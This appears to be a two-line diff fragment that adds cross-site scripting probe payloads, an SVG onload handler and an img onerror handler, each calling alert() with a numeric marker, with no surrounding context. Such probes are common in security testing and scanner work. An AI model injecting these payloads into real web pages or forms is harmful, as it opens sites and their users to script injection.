@@ -1,0 +1,2 @@
+<svg onload=alert(14091608)>
+<img src=xxx:x onerror=javascript:alert(14091608)>
